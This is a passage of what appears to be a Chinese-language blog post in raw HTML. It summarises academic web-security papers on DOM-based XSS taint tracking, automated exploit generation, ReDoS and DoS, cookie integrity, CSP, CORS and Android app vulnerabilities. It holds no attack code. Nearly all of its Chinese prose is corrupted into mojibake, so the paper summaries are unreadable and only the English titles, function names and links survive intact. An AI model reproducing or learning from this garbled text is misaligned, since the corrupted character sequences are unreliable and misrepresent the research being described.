title="æ–¹æ³•"></a>æ–¹æ³•</h3><p>æˆ‘ä»¬ä½¿ç”¨äº†å‘V8å¼•æ“æ³¨å…¥æ±¡ç‚¹æŠ€æœ¯ï¼Œå…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬åœ¨æ¯ä¸ªè¾“å…¥çš„å­—ç¬¦ä¸²ä¸Šå¢åŠ äº†ä¸€ä¸ªæ ‡è®°ï¼Œæœ€åçœ‹è¿™äº›æ ‡è®°æ˜¯å¦ä¼šè¢«document.write()ç­‰å‡½æ•°(sink function)å¸¦å‡ºã€‚åœ¨ä¸­é—´è¿‡ç¨‹ä¸­æˆ‘ä»¬éœ€è¦è€ƒè™‘encodeURIç­‰å‡½æ•°ï¼Œä»–ä»¬åº”ä½¿æ ‡è®°å¤±æ•ˆã€‚</p><ul><li><p>sink functionï¼š</p><ul><li>document.write()</li><li>document.writeln()</li><li>eval()</li><li>è®¾ç½®srcå±æ€§çš„setAttribute</li><li>è®¾ç½®hrefå±æ€§çš„setAttribute</li><li>è®¾ç½®styleå±æ€§çš„setAttribute</li><li>è®¾ç½®äº‹ä»¶ç›‘å¬å±æ€§ï¼ˆonload/onerror/â€¦ï¼‰çš„setAttribute</li><li>åœ¨setTimeoutå’ŒsetIntervalä¸­çš„string2function</li><li>å¯¹document.cookieèµ‹å€¼</li><li>å¯¹document.locationèµ‹å€¼</li></ul></li><li><p>ä½¿æ ‡è®°å¤±æ•ˆçš„å‡½æ•°</p><ul><li><p>escape</p><p>escapeä¸ç¼–ç å­—ç¬¦æœ‰69ä¸ªï¼š*ï¼Œ+ï¼Œ-ï¼Œ.ï¼Œ/ï¼Œ@ï¼Œ_ï¼Œ0-9ï¼Œa-zï¼ŒA-Z</p></li><li><p>encodeURI</p><p>encodeURIä¸ç¼–ç å­—ç¬¦æœ‰82ä¸ªï¼š!ï¼Œ#ï¼Œ$ï¼Œ&amp;ï¼Œâ€™ï¼Œ(ï¼Œ)ï¼Œ*ï¼Œ+ï¼Œ,ï¼Œ-ï¼Œ.ï¼Œ/ï¼Œ:ï¼Œ;ï¼Œ=ï¼Œ?ï¼Œ@ï¼Œ_ï¼Œ~ï¼Œ0-9ï¼Œa-zï¼ŒA-Z</p></li><li><p>encodeURIComponent</p><p>encodeURIComponentä¸ç¼–ç å­—ç¬¦æœ‰71ä¸ªï¼š!ï¼Œ â€˜ï¼Œ(ï¼Œ)ï¼Œ*ï¼Œ-ï¼Œ.ï¼Œ_ï¼Œ~ï¼Œ0-9ï¼Œa-zï¼ŒA-Z</p></li><li><p>encodeHTML</p><p>éœ€è¦è‡ªå·±å†™ï¼Œå°†å­—ç¬¦ä¸²è½¬æ¢æˆhtmlå®ä½“ç¼–ç </p></li></ul></li></ul><h3 id="å®éªŒç»“æœ"><a href="#å®éªŒç»“æœ" class="headerlink" title="å®éªŒç»“æœ"></a>å®éªŒç»“æœ</h3><p>æˆ‘ä»¬ä¸å…¶ä»–é™æ€å·¥å…·åšå¯¹æ¯”ï¼Œå‘ç°BurpSuiteåªå‘ç°äº†10%çš„é—®é¢˜ï¼Œä½†æ˜¯å‘ç°äº†ä¸€äº›å…¶ä»–æˆ‘ä»¬æ²¡æœ‰å‘ç°çš„é—®é¢˜ï¼Œè€Œå…¶ä»–å·¥å…·å­˜åœ¨ç›¸å½“é«˜çš„è¯¯æŠ¥ç‡â€”â€”95%</p><h3 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h3><ul><li><a href="https://github.com/wrmelicher/ChromiumTaintTracking" target="_blank" rel="noopener">https://github.com/wrmelicher/ChromiumTaintTracking</a></li><li>S. Lekies, B. Stock, and M. Johns, â€œ25 million flows later: large-scale detection of DOM-based XSS,â€ in Proc. CCS, 2013, pp. 1193â€“1204.</li></ul><h2 id="Precise-Client-side-Protection-against-DOM-based-Cross-Site-Scripting-usenix14"><a href="#Precise-Client-side-Protection-against-DOM-based-Cross-Site-Scripting-usenix14" class="headerlink" title="Precise Client-side Protection against DOM-based Cross-Site Scripting, usenix14"></a>Precise Client-side Protection against DOM-based Cross-Site Scripting, usenix14</h2><p>ç›®å‰å¯¹XSSçš„é˜²å¾¡ä¾èµ–äºå­—ç¬¦ä¸²æ£€æµ‹ï¼Œæœ¬æ–‡é€šè¿‡å®éªŒæ­ç¤ºäº†è¿™ç§æ–¹æ³•ä¸èƒ½æŠµå¾¡æ‰€æœ‰çš„XSSæ”»å‡»ï¼Œä¸ºæ­¤ï¼Œæœ¬æ–‡æå‡ºäº†ä¸€ç§åŸºäºæ±¡ç‚¹è·Ÿè¸ªå’Œæ„ŸçŸ¥çš„XSSè¿‡æ»¤å™¨ã€‚</p><h2 id="Static-Detection-of-Second-Order-Vulnerabilities-in-Web-Applications-usenix14"><a href="#Static-Detection-of-Second-Order-Vulnerabilities-in-Web-Applications-usenix14" class="headerlink" title="Static Detection of Second-Order Vulnerabilities in Web Applications, usenix14"></a>Static Detection of Second-Order Vulnerabilities in Web Applications, usenix14</h2><p>Second-Orderæ¼æ´æ˜¯æŒ‡æ”»å‡»è½½è·é¦–å…ˆå­˜å‚¨åœ¨åº”ç”¨æœåŠ¡å™¨ä¸Šï¼Œæ¥ç€åœ¨å…¶ä»–æ“ä½œæ—¶è§¦å‘çš„æ¼æ´ï¼Œæœ¬æ–‡ç¬¬ä¸€ä¸ªæå‡ºäº†æ£€æµ‹è¯¥æ¼æ´çš„é™æ€ä»£ç åˆ†ææ–¹æ³•ï¼Œå…¶é€šè¿‡æ£€æµ‹è¿æ¥æ•°æ®åº“æˆ–å¯¹webåº”ç”¨å†…å­˜çš„è¯»å–å’Œå†™å…¥æ“ä½œæ£€æµ‹è¯¥é—®é¢˜ã€‚</p><h1 id="EXP-Generation"><a href="#EXP-Generation" class="headerlink" title="EXP Generation"></a>EXP Generation</h1><h2 id="NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications-usenix18"><a href="#NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications-usenix18" class="headerlink" title="NAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications, usenix18*"></a>NAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications, usenix18*</h2><p>æœ¬æ–‡æ„é€ äº†ä¸€ä¸ªå¯æ‹“å±•çš„åŠ¨é™ç»“åˆçš„webæ¼æ´ç”Ÿæˆæ¡†æ¶ï¼Œç¬¬ä¸€æ­¥ï¼Œä½¿ç”¨ç¬¦å·æ‰§è¡Œæ„å»ºå„ä¸ªæ¨¡å—çš„è¡Œä¸ºæ¨¡å‹ï¼Œç¬¬äºŒæ­¥ï¼Œæ„å»ºåº”ç”¨å¹¶ä¸”ä½¿ç”¨çˆ¬è™«è·å–ç½‘ç«™è·¯å¾„ï¼ŒåŒæ—¶ä½¿ç”¨åŠ¨æ€ç¬¦å·æ‰§è¡Œæœ€å¤§åŒ–ä»£ç è¦†ç›–èŒƒå›´</p><h3 id="ç›¸å…³èµ„æ–™"><a href="#ç›¸å…³èµ„æ–™" class="headerlink" title="ç›¸å…³èµ„æ–™"></a>ç›¸å…³èµ„æ–™</h3><ul><li><a href="https://github.com/aalhuz/navex" target="_blank" rel="noopener">https://github.com/aalhuz/navex</a></li></ul><h2 id="Chainsaw-Chained-Automated-Workflow-based-Exploit-Generation-ccs16"><a href="#Chainsaw-Chained-Automated-Workflow-based-Exploit-Generation-ccs16" class="headerlink" title="Chainsaw: Chained Automated Workflow-based Exploit Generation, ccs16*"></a>Chainsaw: Chained Automated Workflow-based Exploit Generation, ccs16*</h2><p>æˆ‘ä»¬è®¾è®¡äº†ä¸€å¥—EXPç”Ÿæˆå·¥å…·ï¼Œä»¥æé«˜webæ³¨å…¥æ¼æ´çš„è¯†åˆ«èƒ½åŠ›ã€‚ä¸ºæ­¤è¯¥å·¥å…·åŸºäºåº”ç”¨çš„æ•°æ®æµï¼Œæ•°æ®åº“æ¨¡å‹å’Œæœ¬æœºå‡½æ•°ç­‰åº”å¯¹webåº”ç”¨ç¨‹åºçš„å¤šæ¨¡å—ï¼Œç”¨æˆ·è¾“å…¥å’Œå¤šå±‚æ¶æ„çš„æŒ‘æˆ˜ã€‚</p><h1 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h1><h2 id="Rampart-protecting-web-applications-from-CPU-exhaustion-denial-of-service-attacks-defend-usenix18"><a href="#Rampart-protecting-web-applications-from-CPU-exhaustion-denial-of-service-attacks-defend-usenix18" class="headerlink" title="Rampart: protecting web applications from CPU-exhaustion denial-of-service attacks(defend), usenix18"></a>Rampart: protecting web applications from CPU-exhaustion denial-of-service attacks(defend), usenix18</h2><p>é«˜åº¦å¤æ‚çš„DoSæ”»å‡»åªéœ€è¦å°‘é‡è¯·æ±‚å°±å¯å¯¼è‡´å¤§é‡èµ„æºæ¶ˆè€—ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬è®¾è®¡å·¥å…·Rampartï¼Œå®ƒé€šè¿‡ç»Ÿè®¡æ–¹æ³•å’Œå‡½æ•°çº§åˆ«çš„ç¨‹åºåˆ†ææ–¹æ³•ï¼Œåˆæˆå¹¶éƒ¨ç½²è¿‡æ»¤å™¨æ¥é˜»æ­¢DoSæ”»å‡»ã€‚</p><h2 id="Tail-Attacks-on-Web-Applications-ccs17"><a href="#Tail-Attacks-on-Web-Applications-ccs17" class="headerlink" title="Tail Attacks on Web Applications, ccs17"></a>Tail Attacks on Web Applications, ccs17</h2><p>æœ¬æ–‡ä»‹ç»äº†ä¸€ç§æ–°å‹çš„DDoSæ”»å‡»ï¼Œè¿™ç§æ”»å‡»åˆ©ç”¨äº†ç½‘ç»œåº”ç”¨çš„å¤æ‚æ€§å’Œä¾èµ–äºåˆ†å¸ƒå¼çš„ç‰¹æ€§ï¼Œä½¿ç½‘ç»œå“åº”å¤§äº1ç§’ï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªæ¨¡å‹æ¥æ£€æµ‹è¿™ä¸€æ”»å‡»å¹¶ä¸”æå‡ºäº†ä¸€ç§é˜²å¾¡æ–¹æ³•ã€‚</p><h2 id="Freezing-the-Web-A-Study-of-ReDoS-Vulnerabilities-in-JavaScript-based-Web-Servers-usenix18"><a href="#Freezing-the-Web-A-Study-of-ReDoS-Vulnerabilities-in-JavaScript-based-Web-Servers-usenix18" class="headerlink" title="Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers, usenix18"></a>Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers, usenix18</h2><p>JavaScriptçš„å•çº¿ç¨‹æ‰§è¡Œæ¨¡å‹ä½¿å¾—åŸºäºJavaScriptçš„webæœåŠ¡å™¨ç‰¹åˆ«å®¹æ˜“å—åˆ°ReDoSæ”»å‡»ã€‚å› æ­¤æˆ‘ä»¬å¯¹2846ä¸ªæµè¡Œçš„ç½‘ç«™è¿›è¡Œåˆ†æï¼Œå¹¶ä¸”å‘ç°äº†25ä¸ªä¹‹å‰æœªçŸ¥çš„æµè¡Œæ¨¡å—æ¼æ´ã€‚</p><h2 id="The-impact-of-regular-expression-denial-of-service-ReDoS-in-practice-an-empirical-study-at-the-ecosystem-scale-survey-fse18"><a href="#The-impact-of-regular-expression-denial-of-service-ReDoS-in-practice-an-empirical-study-at-the-ecosystem-scale-survey-fse18" class="headerlink" title="The impact of regular expression denial of service (ReDoS) in practice: an empirical study at the ecosystem scale(survey), fse18"></a>The impact of regular expression denial of service (ReDoS) in practice: an empirical study at the ecosystem scale(survey), fse18</h2><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¯¼è‡´æ‹’ç»æœåŠ¡çš„æ–°åŸå› ï¼Œæœ¬æ–‡ç ”ç©¶äº†ReDoSçš„ä¸‰ä¸ªæ–¹é¢ï¼šå®é™…ä¸­è¶…çº¿æ€§æ­£åˆ™è¡¨è¾¾å¼ï¼ˆsuper-linear regexï¼‰çš„ä½¿ç”¨ç‡ï¼Œä»–ä»¬å¦‚ä½•é¢„é˜²DoSæ”»å‡»ä»¥åŠä»–ä»¬å¦‚ä½•è¢«ä¿®å¤ã€‚æœ¬æ–‡å‘ç°å¤§é‡çš„JavaScriptå’ŒPythonä¾é æ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒæ—¶åæ¨¡å¼ï¼ˆanti-patternsï¼‰æœ‰å¾ˆå°‘çš„æ¼æŠ¥ä½†æ˜¯æœ‰å¾ˆå¤šè¯¯æŠ¥ï¼Œå› æ­¤è¿™äº›åæ¨¡å¼æ˜¯å¿…è¦ä½†ä¸å……åˆ†çš„ã€‚æœ€åå‘ç°å¯¹å¾…è¶…çº¿æ€§çš„è¡¨è¾¾å¼ï¼Œå¼€å‘è€…æ„¿æ„ä¿®æ”¹å®ƒè€Œä¸æ˜¯æˆªæ–­è¾“å…¥æˆ–æ˜¯å†™æ–°çš„ã€‚</p><h2 id="ReScue-crafting-regular-expression-DoS-attacks-ase18"><a href="#ReScue-crafting-regular-expression-DoS-attacks-ase18" class="headerlink" title="ReScue: crafting regular expression DoS attacks, ase18"></a>ReScue: crafting regular expression DoS attacks, ase18</h2><p>æœ¬æ–‡ä»‹ç»äº†ä¸€ç§ä¸‰é˜¶æ®µç°ç›’åˆ†ææŠ€æœ¯ReScureï¼Œå®ƒå¯ä»¥è‡ªåŠ¨ç”ŸæˆReDoSå­—ç¬¦ä¸²ã€‚å®ƒé€šè¿‡é—ä¼ ç®—æ³•é€‰æ‹©ç§å­ï¼Œæ¥ç€ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç®—æ³•é€‰æ‹©å…·æœ‰æœ€å¤§æœç´¢æ—¶é—´çš„å­—ç¬¦ä¸²ã€‚</p><p>å¤‡æ³¨ï¼šå—å¤§è®¡ç®—æœºåšçš„ç ”ç©¶ï¼Œå¥½åƒä¹Ÿåœ¨æç§»åŠ¨æµ‹è¯•</p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="Who-left-open-the-cookie-jar-a-comprehensive-evaluation-of-third-party-cookie-policies-survey-usenix18"><a href="#Who-left-open-the-cookie-jar-a-comprehensive-evaluation-of-third-party-cookie-policies-survey-usenix18" class="headerlink" title="Who left open the cookie jar? a comprehensive evaluation of third-party cookie policies (survey), usenix18"></a>Who left open the cookie jar? a comprehensive evaluation of third-party cookie policies (survey), usenix18</h2><p>cookieå®¹æ˜“å—åˆ°XSSæ”»å‡»ï¼Œä¸ºæ­¤æµè§ˆå™¨å½¢æˆäº†å„ç§ä¿æŠ¤æœºåˆ¶å’Œæ”¿ç­–ï¼Œæœ¬æ–‡èƒ½é€šè¿‡ä¸€ä¸ªå¼ºåˆ¶æ‰§è¡Œç¬¬ä¸‰æ–¹è¯·æ±‚çš„æ¡†æ¶è‡ªåŠ¨åŒ–è¯„ä¼°è¿™äº›é˜²å¾¡æœºåˆ¶çš„æœ‰æ•ˆæ€§ï¼Œæˆ‘ä»¬è¯„ä¼°äº†7ä¸ªæµè§ˆå™¨çš„ç­–ç•¥å®ç°å’Œ46ä¸ªæµè§ˆå™¨æ’ä»¶ï¼Œæˆ‘ä»¬å‘ç°å³ä½¿æ˜¯å†…ç½®çš„ä¿æŠ¤æœºåˆ¶ä¹Ÿå¯ä»¥è¢«è®¸å¤šæ–°æŠ€æœ¯ç»•è¿‡ã€‚</p><p>æ€è€ƒï¼šAndroid Browseræ˜¯ä¸æ˜¯ä¹Ÿæœ‰è¿™ç±»é—®é¢˜ï¼Ÿ</p><h2 id="Cookies-Lack-Integrity-Real-World-Implications-survey-usenix15"><a href="#Cookies-Lack-Integrity-Real-World-Implications-survey-usenix15" class="headerlink" title="Cookies Lack Integrity: Real-World Implications (survey), usenix15"></a>Cookies Lack Integrity: Real-World Implications (survey), usenix15</h2><p>è®¾ç½®äº†secureæ ‡å¿—çš„cookieä¼šè¢«httpsåŠ å¯†ä¼ è¾“ï¼Œç„¶è€Œcookieçš„å®Œæ•´æ€§ä»ç„¶ä¼šå—åˆ°æ”»å‡»ï¼ˆæ²¡æœ‰åº”ç”¨HSTSï¼‰ï¼Œæœ¬æ–‡æ—¨åœ¨äº†è§£æ”»å‡»è€…å¦‚ä½•è¿›è¡Œä¸€ä¸ªcookieæ³¨å…¥æ”»å‡»ã€‚</p><h2 id="The-Cracked-Cookie-Jar-HTTP-Cookie-Hijacking-and-the-Exposure-of-Private-Information-survey-S-amp-P16"><a href="#The-Cracked-Cookie-Jar-HTTP-Cookie-Hijacking-and-the-Exposure-of-Private-Information-survey-S-amp-P16" class="headerlink" title="The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information (survey), S&amp;P16"></a>The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information (survey), S&amp;P16</h2><p>ç”±äºä¸ä½¿ç”¨HTTPSï¼Œhttpå­˜åœ¨ä¸­é—´äººæ”»å‡»çš„é—®é¢˜ï¼Œæœ¬æ–‡æ€»ç»“äº†è¿™äº›é—®é¢˜ã€‚</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h2 id="CCSP-Controlled-Relaxation-of-Content-Security-Policies-by-Runtime-Policy-Composition-defense-usenix17"><a href="#CCSP-Controlled-Relaxation-of-Content-Security-Policies-by-Runtime-Policy-Composition-defense-usenix17" class="headerlink" title="CCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition (defense), usenix17"></a>CCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition (defense), usenix17</h2><p>CSP(Content Security Policy)æ˜¯W3Cè®¾è®¡çš„ç”¨æ¥é˜²å¾¡å†…å®¹æ³¨å…¥çš„æ ‡å‡†ï¼Œä½†æ˜¯å…¶é™æ€ç™½åå•çš„ç­–ç•¥è¢«å…ˆå‰çš„ç ”ç©¶è´¨ç–‘ï¼Œæœ¬æ–‡ä»‹ç»äº†ä¸€ç§CSPçš„æ‹“å±•CCSPï¼Œæ—¨åœ¨å…‹æœé™æ€ç™½åå•æ‰€æ¥å¸¦æ¥çš„é™åˆ¶åŒæ—¶é¿å…å¤§å¹…åº¦ä¿®æ”¹åŸå…ˆçš„CSPã€‚</p><h2 id="CSPAutoGen-Black-box-Enforcement-of-Content-Security-Policy-upon-Real-world-Websites-defense-ccs16"><a href="#CSPAutoGen-Black-box-Enforcement-of-Content-Security-Policy-upon-Real-world-Websites-defense-ccs16" class="headerlink" title="CSPAutoGen: Black-box Enforcement of Content Security Policy upon Real-world Websites (defense), ccs16"></a>CSPAutoGen: Black-box Enforcement of Content Security Policy upon Real-world Websites (defense), ccs16</h2><p>CSPæ˜¯é˜²å¾¡XSSæ”»å‡»çš„å¥½æ–¹å¼ï¼Œä½†æ˜¯æ®äº†è§£åªæœ‰0.002%çš„ç½‘ç«™ä½¿ç”¨äº†CSPï¼Œä¸ºæ­¤æˆ‘ä»¬è®¾è®¡äº†å·¥å…·CSPAutoGenï¼Œä»–ä¸ºæ¯ä¸ªç½‘ç«™è®­ç»ƒä¸€ä¸ªæ¨¡æ¿ï¼Œå†åŸºäºæ¨¡æ¿äº§ç”ŸCSPè§„åˆ™ã€‚</p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><h2 id="We-Still-Donâ€™t-Have-Secure-Cross-Domain-Requests-an-Empirical-Study-of-CORS-survey-usenix18"><a href="#We-Still-Donâ€™t-Have-Secure-Cross-Domain-Requests-an-Empirical-Study-of-CORS-survey-usenix18" class="headerlink" title="We Still Donâ€™t Have Secure Cross-Domain Requests: an Empirical Study of CORS (survey), usenix18"></a>We Still Donâ€™t Have Secure Cross-Domain Requests: an Empirical Study of CORS (survey), usenix18</h2><p>å¼€å‘è€…æå‡ºä¸€äº›è§£å†³æ–¹æ³•ï¼ˆæ¯”å¦‚JSONPï¼‰æ¥ç»•è¿‡åŒæºç­–ç•¥ï¼Œè¿™äº›æ–¹æ³•åŒæ—¶å¼•å…¥äº†å®‰å…¨é—®é¢˜ï¼ŒCORSæ˜¯ä¸€ç§æ›´åŠ è§„èŒƒçš„æœºåˆ¶ï¼Œä½†æ˜¯æœ¬æ–‡é€šè¿‡å®è¯ç ”ç©¶å‘ç°ï¼ŒCORSçš„è®¾è®¡å’Œéƒ¨ç½²å—åˆ°è®¸å¤šæ–°çš„å®‰å…¨é—®é¢˜å½±å“ï¼š1ï¼‰CORSæ”¾å®½äº†è·¨åŸŸå†™æƒé™2ï¼‰å¼€å‘äººå‘˜ä¸äº†è§£CORSå¯¼è‡´é”™è¯¯é…ç½®ã€‚</p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="Time-Does-Not-Heal-All-Wounds-A-Longitudinal-Analysis-of-Security-Mechanism-Support-in-Mobile-Browsers-suvery-ndss19"><a href="#Time-Does-Not-Heal-All-Wounds-A-Longitudinal-Analysis-of-Security-Mechanism-Support-in-Mobile-Browsers-suvery-ndss19" class="headerlink" title="Time Does Not Heal All Wounds: A Longitudinal Analysis of Security-Mechanism Support in Mobile Browsers (suvery), ndss19"></a>Time Does Not Heal All Wounds: A Longitudinal Analysis of Security-Mechanism Support in Mobile Browsers (suvery), ndss19</h2><p>æœ¬æ–‡å‘ç°webåº”ç”¨å­˜åœ¨çš„é—®é¢˜ä»ç„¶ä¼šåœ¨Androidä¸­å‡ºç°ï¼Œä½†æ˜¯å¾ˆå¤šç§»åŠ¨ç«¯æµè§ˆå™¨å¹¶æ²¡æœ‰éµä»å®‰å…¨å‡†åˆ™ï¼ˆHTTP Headerï¼‰ã€‚</p><p>è¢«è°ƒæŸ¥çš„HTTP Headerï¼š</p><p><img src="/å­¦æœ¯-å­¦æœ¯åœˆ2014-2019Webå®‰å…¨æ–¹å‘ç ”ç©¶æƒ…å†µ/1547798650411.png" alt="1547798650411"></p><h2 id="Understanding-Open-Ports-in-Android-Applications-Discovery-Diagnosis-and-Security-Assessment-ndss19"><a href="#Understanding-Open-Ports-in-Android-Applications-Discovery-Diagnosis-and-Security-Assessment-ndss19" class="headerlink" title="Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment, ndss19"></a>Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment, ndss19</h2><p>æœ¬æ–‡é€šè¿‡ä¼—åŒ…æ–¹å¼äº†è§£åˆ°Androidåº”ç”¨ç¨‹åºä¸­å¼€æ”¾ç«¯å£çš„æ™®åŠåº¦ä¸º15.3%ï¼›æœ¬æ–‡è¿˜å¼€å‘äº†ä¸€ç§æ–°çš„é™æ€è¯Šæ–­å·¥å…·ï¼Œæ˜¾ç¤º61.8%çš„å¼€æ”¾ç«¯å£åº”ç”¨ç¨‹åºå®Œå…¨æ˜¯ç”±åµŒå…¥å¼sdkå¼€å‘çš„ï¼Œ20.7%çš„åº”ç”¨ç¨‹åºä½¿ç”¨äº†ä¸å®‰å…¨çš„APIã€‚æˆ‘ä»¬å¾—å‡ºå…³äºç«¯å£å®‰å…¨çš„ä¸‰ä¸ªç»“è®ºï¼šï¼ˆ1ï¼‰è„†å¼±æ€§åˆ†ææ˜¾ç¤ºäº†ä»¥Instagramï¼ŒSamsungGearï¼ŒSkypeï¼Œå’ŒFacebookSDKä¸ºé¦–çš„5ç§è„†å¼±çš„æ¨¡å¼ï¼›ï¼ˆ2ï¼‰ä¼—åŒ…æ˜¾ç¤ºäº†224ä¸ªèœ‚çªç½‘ç»œå’Œ2181ä¸ªWiFiæ¨¡å¼ï¼›ï¼ˆ3ï¼‰å…³äºå¯¹ç«¯å£è¿›è¡ŒDoSæ”»å‡»çš„å®éªŒæ€§æ¼”ç¤º</p><h2 id="FlowCog-Context-aware-Semantics-Extraction-and-Analysis-of-Information-Flow-Leaks-in-Android-Apps-usenix18"><a href="#FlowCog-Context-aware-Semantics-Extraction-and-Analysis-of-Information-Flow-Leaks-in-Android-Apps-usenix18" class="headerlink" title="FlowCog: Context-aware Semantics Extraction and Analysis of Information Flow Leaks in Android Apps, usenix18"></a>FlowCog: Context-aware Semantics Extraction and Analysis of Information Flow Leaks in Android Apps, usenix18</h2><p>Androidè®¿é—®ç§äººä¿¡æ¯æ˜¯å¦åˆæ³•å–å†³äºåº”ç”¨æ˜¯å¦å‘ç”¨æˆ·æä¾›äº†è¶³å¤Ÿçš„è§£é‡Šï¼ŒFlowCogä»Androidè§†å›¾ä¸­æŠ½å–ç›¸å…³çš„è¯­ä¹‰ï¼Œå†ç”¨NLPæ–¹æ³•æ¨æ–­è¯­ä¹‰ä¸ç»™å®šæµæ˜¯å¦ç›¸å…³ã€‚</p><h3 id="ç›¸å…³èµ„æ–™-1"><a href="#ç›¸å…³èµ„æ–™-1" class="headerlink" title="ç›¸å…³èµ„æ–™"></a>ç›¸å…³èµ„æ–™</h3><ul><li>https: //github.com/SocietyMaster/FlowCog. </li></ul><h2 id="Study-and-Mitigation-of-Origin-Stripping-Vulnerabilities-in-Hybrid-postMessage-Enabled-Mobile-Applications-S-amp-P18"><a href="#Study-and-Mitigation-of-Origin-Stripping-Vulnerabilities-in-Hybrid-postMessage-Enabled-Mobile-Applications-S-amp-P18" class="headerlink" title="Study and Mitigation of Origin Stripping Vulnerabilities in Hybrid-postMessage Enabled Mobile Applications, S&amp;P18"></a>Study and Mitigation of Origin Stripping Vulnerabilities in Hybrid-postMessage Enabled Mobile Applications, S&amp;P18</h2><p>web appé€šè¿‡postè¿›è¡Œè·¨åŸŸè¯·æ±‚ï¼Œå®‰å“çš„æ··åˆåº”ç”¨ä¹Ÿä¼šä½¿ç”¨è¿™äº›æŠ€æœ¯ï¼Œå®ƒæ‹“å±•äº†postMessageï¼ˆæˆ‘ä»¬ç§°ä¸ºâ€œhybird postMessageâ€ï¼ŒåŒæ—¶ä¹Ÿå¼•å…¥äº†æ–°çš„é—®é¢˜â€”â€”origin stripping vulnerabilityã€‚æœ¬æ–‡ä¸­æˆ‘ä»¬è®¾è®¡äº†ä¸€ä¸ªå·¥å…·æ¥æ£€æµ‹è¿™é—®é¢˜ã€‚</p><h2 id="Mobile-Application-Web-API-Reconnaissance-Web-to-Mobile-Inconsistencies-amp-Vulnerabilities-S-amp-P18"><a href="#Mobile-Application-Web-API-Reconnaissance-Web-to-Mobile-Inconsistencies-amp-Vulnerabilities-S-amp-P18" class="headerlink" title="Mobile Application Web API Reconnaissance: Web-to-Mobile Inconsistencies &amp; Vulnerabilities, S&amp;P18**"></a>Mobile Application Web API Reconnaissance: Web-to-Mobile Inconsistencies &amp; Vulnerabilities, S&amp;P18**</h2><p>ä¸ºäº†èŠ‚çº¦ç®—åŠ›ï¼Œå¾ˆå¤šwebAPIçš„éªŒè¯å·¥ä½œä¼šåœ¨ç§»åŠ¨ç«¯è¿›è¡Œï¼Œä½†æ˜¯å¦‚æœwebç«¯ä¸é‡å¤éªŒè¯çš„è¯ï¼Œå°±ä¼šäº§ç”Ÿä¸ä¸€è‡´çš„é—®é¢˜ï¼Œæ”»å‡»è€…å¯ä»¥ç¯¡æ”¹æµé‡æ¥æ”»å‡»webåº”ç”¨ã€‚æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æå‡ºä¸€ä¸ªå·¥å…·ï¼šWARDroidï¼Œå®ƒå¯ä»¥è‡ªåŠ¨åŒ–çš„å¯»æ‰¾webç«¯å’Œç§»åŠ¨ç«¯çš„ä¸ä¸€è‡´é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼ŒWARDroidé™æ€åˆ†æandroid appä¸­çš„httpé€šè®¯æ¨¡æ¿ï¼Œæ¥ç€é€šè¿‡é»‘ç›’æµ‹è¯•çš„æ–¹æ³•è¯†åˆ«ä¸ä¸€è‡´æ€§ã€‚</p><p><strong>Idea: </strong>å¯ä¸å¯ä»¥åšä¸€ä¸ªwebçš„ï¼Ÿå› ä¸ºwebçš„å‰åç«¯åˆ†ç¦»ä¹Ÿä¼šé€ æˆä¸ä¸€è‡´é—®é¢˜(ä¼šè®®ä¸Šæœ‰äººæé—®)ã€‚</p><h3 id="Extract-Backward"><a href="#Extract-Backward" class="headerlink" title="Extract Backward"></a>Extract Backward</h3><p><img src="/å­¦æœ¯-å­¦æœ¯åœˆ2014-2019Webå®‰å…¨æ–¹å‘ç ”ç©¶æƒ…å†µ/1547692426847.png" alt="1547692426847"></p><h3 id="HTTP-Request-Templates"><a href="#HTTP-Request-Templates" class="headerlink" title="HTTP Request Templates"></a>HTTP Request Templates</h3><p><img src="/å­¦æœ¯-å­¦æœ¯åœˆ2014-2019Webå®‰å…¨æ–¹å‘ç ”ç©¶æƒ…å†µ/1547692490082.png" alt="1547692490082"></p><h2 id="Measuring-the-Insecurity-of-Mobile-Deep-Links-of-Android-usenix17"><a href="#Measuring-the-Insecurity-of-Mobile-Deep-Links-of-Android-usenix17" class="headerlink" title="Measuring the Insecurity of Mobile Deep Links of Android, usenix17"></a>Measuring the Insecurity of Mobile Deep Links of Android, usenix17</h2><p>Deep Linkæ˜¯æŒ‡åº”ç”¨å†…ç‰¹æ®Šçš„URIï¼Œå®ƒæœ‰åŠ©äºç½‘ç»œåˆ°åº”ç”¨çš„é€šä¿¡ï¼ŒAndroidæ¨å‡ºäº†ä¸¤ç§æ–°æ–¹æ³•â€App linksâ€å’Œâ€œIntent URLsâ€ç”¨æ¥æ›¿æ¢scheme 